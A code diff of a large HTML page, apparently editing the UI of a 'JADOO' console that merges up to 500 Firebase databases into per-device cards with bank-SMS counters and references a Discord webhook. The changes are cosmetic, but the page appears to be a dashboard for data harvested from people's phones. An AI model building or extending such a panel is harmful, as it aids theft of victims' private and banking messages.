@@ -26178,13 +26178,13 @@ console.log("✅ Discord webhook integration loaded!");
         vertical-align: middle !important;
     }
 </style>
-                                    <!-- JADOO Multi-Merge Full Console Feature -->
+            <!-- JADOO Multi-Firebase Real-Time Merge Console -->
 <div id="jad-fab" style="position: fixed; bottom: 25px; right: 25px; width: 52px; height: 52px; background: #dc2626; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; box-shadow: 0 6px 20px rgba(0,0,0,0.8); z-index: 99999; font-weight: bold; border: 2px solid rgba(255,255,255,0.2);">⚡</div>
 
-<div id="jad-modal" style="display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100000; padding: 15px; align-items: center; justify-content: center; font-family: sans-serif;">
-    <div style="background: #0a0a0a; border: 1px solid #222; width: 100%; max-width: 480px; padding: 20px; border-radius: 20px; color: #fff; max-height: 92vh; overflow-y: auto; box-sizing: border-box;">
+<div id="jad-modal" style="display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 100000; padding: 15px; align-items: center; justify-content: center; font-family: sans-serif;">
+    <div style="background: #0a0a0a; border: 1px solid #222; width: 100%; max-width: 480px; padding: 20px; border-radius: 20px; color: #fff; max-height: 94vh; overflow-y: auto; box-sizing: border-box;">
         
-        <!-- Modal Header -->
+        <!-- Header -->
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
             <div style="display: flex; align-items: center; gap: 10px;">
                 <div style="width: 32px; height: 32px; background: rgba(220,38,38,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #f87171; font-weight: bold;">⚡</div>
@@ -26193,14 +26193,14 @@ console.log("✅ Discord webhook integration loaded!");
             <button onclick="document.getElementById('jad-modal').style.display='none'" style="background: #111; border: 1px solid #333; color: #aaa; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-size: 14px;">✕</button>
         </div>
 
-        <!-- Input Area -->
+        <!-- Input Setup -->
         <div id="jad-setup-sec">
             <p style="font-size: 11px; color: #9ca3af; margin-bottom: 8px;">Upto 500 Firebase URLs line-by-line paste karein:</p>
             <textarea id="jad-urls-input" rows="5" style="width: 100%; background: #000; border: 1px solid #222; color: #fff; padding: 12px; border-radius: 12px; font-size: 11px; margin-bottom: 12px; box-sizing: border-box; font-family: monospace;" placeholder="https://db1-default-rtdb.firebaseio.com/&#10;https://db2-default-rtdb.firebaseio.com/"></textarea>
             <button onclick="startJadMulti()" style="width: 100%; background: #dc2626; color: white; border: none; padding: 12px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 13px; box-shadow: 0 4px 12px rgba(220,38,38,0.4);">🚀 Load Multi-Console</button>
         </div>
 
-        <!-- Dashboard View (Hidden initially) -->
+        <!-- Merged Dashboard View -->
         <div id="jad-dash-sec" style="display: none;">
             <!-- Stats Bar -->
             <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; background: rgba(255,255,255,0.03); border: 1px solid #222; padding: 10px; border-radius: 14px; text-align: center; margin-bottom: 15px;">
@@ -26224,7 +26224,7 @@ console.log("✅ Discord webhook integration loaded!");
 
             <!-- Cards Container -->
             <div id="jad-cards-list" style="display: flex; flex-direction: column; gap: 12px; max-height: 55vh; overflow-y: auto; padding-right: 2px;">
-                <!-- Merged Device Cards will render here -->
+                <!-- Merged Device Cards -->
             </div>
         </div>
     </div>
@@ -26341,5 +26341,4 @@ console.log("✅ Discord webhook integration loaded!");
         document.getElementById('st-sms').innerText = bankSmsCount;
     }
 </script>
-
 </body></html>
